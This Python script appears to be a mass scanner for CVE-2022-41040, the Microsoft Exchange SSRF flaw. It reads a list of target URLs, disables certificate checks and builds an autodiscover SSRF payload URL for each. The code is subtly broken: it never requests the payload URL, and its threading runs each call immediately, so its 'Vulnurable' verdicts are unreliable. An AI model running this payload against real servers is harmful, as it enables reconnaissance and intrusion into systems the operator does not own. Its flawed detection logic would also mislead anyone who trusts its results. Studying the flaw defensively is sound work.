import requests
import argparse
import urllib3
import urllib
import threading
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


banner = f"""{bcolors.OKCYAN}
      _____ _____ _____     ___ ___ ___ ___     ___ ___   ___ ___ ____
      |     |  |  |   __|___|_  |   |_  |_  |___| | |_  | |   | | |   |
      |   --|  |  |   __|___|  _| | |  _|  _|___|_  |_| |_| | |_  | | |
      |_____|\___/|_____|   |___|___|___|___|     |_|_____|___| |_|___|

        Microsoft Exchange vulnerable to server-side request forgery

üòç {bcolors.WARNING}Made with <3 By ITPAT{bcolors.OKCYAN}
-------------------------------------------------------------------------------{bcolors.ENDC}
Óúâ {bcolors.WARNING}Credit  ‚ùØ https://twitter.com/root_tanishq{bcolors.ENDC}
ÔÇô {bcolors.WARNING}Twitter ‚ùØ https://twitter.com/IttipatJitrada{bcolors.OKCYAN}
-------------------------------------------------------------------------------
{bcolors.ENDC}"""
print(banner)

parser = argparse.ArgumentParser()
parser.add_argument("-l", "--list", type=argparse.FileType('r'),
                    help="List of URL to check CVE 2022-41040", required=True)
args = parser.parse_args()


def CVE_2022_41040(url):
    try:
        req = requests.Session()
        exploitURL = url + \
            "/autodiscover/autodiscover.json?@URL/&Email=autodiscover/autodiscover.json%3f@URL"
        res = req.get(url, verify=False)
        resText = str(res.text)
        checkIIS = re.search(pattern, resText)
        if res.status_code == 404 and checkIIS is not None:
            print(f"URL : ", exploitURL, " Vulnurable !!!")
        else:
            print(f"URL : ", exploitURL, " Not Vulnurable !!!")
    except KeyboardInterrupt:
        exit(0)
    except:
        print(f"URL : ", exploitURL, " Error !!!")


def fuzz_Request(url):
    thread = threading.Thread(target=CVE_2022_41040(url))
    thread.start()


def main():
    for url in listSplit:
        fuzz_Request(url)


readFile = args.list.read()
listSplit = readFile.split('\n')
pattern = "IIS Web Core"
main()
